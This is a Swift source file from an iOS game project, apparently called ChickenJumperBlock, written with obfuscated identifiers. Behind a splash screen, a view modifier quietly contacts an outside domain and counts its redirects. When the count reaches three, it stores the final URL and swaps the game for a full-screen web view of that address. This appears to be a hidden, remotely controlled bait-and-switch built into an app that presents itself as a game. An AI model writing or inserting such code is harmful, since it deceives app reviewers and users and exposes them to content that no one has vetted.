//
//  EveryitihstarView.swift
//  ChickenJumperBlock
//
//  Created by Nicolae Chivriga on 26/02/2025.
//

import SwiftUI
import Lottie


struct EveryitihstarView: View {
    @State var goiuwqm: Bool = false
    var body: some View {
        ZStack {
            Image("orugebgkr")
                .resizable()
                .ignoresSafeArea()
            NavigationLink("", destination: CentermivView(), isActive: $goiuwqm)
            LottieView(animation: .named("razveastaiou"))
                .playing(loopMode: .loop)
                .resizable()
                .frame(width: 125, height: 125)
        }
        .spqriutpreisu()
        .onAppear() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.6) {
                goiuwqm = true
            }
            
        }
    }
}
import WebKit
struct Wikruqbotwbz: ViewModifier {
    @AppStorage("adapt") var wonruder: URL?
    @State var webView: WKWebView = WKWebView()
   
    
   

    @State var skgie: Bool = true
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if wonruder != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: wonruder!)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: wonruder!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.iimusynbeqasbqer = .all
                    }
                   
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if wonruder == nil {
                checkpesk()
            } else {
                skgie = false
            }
        }
    }

    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
           
                redirects1 += 1
                if redirects1 >= 3 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func checkpesk() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/ochijumpr") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            wonruder = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }
}
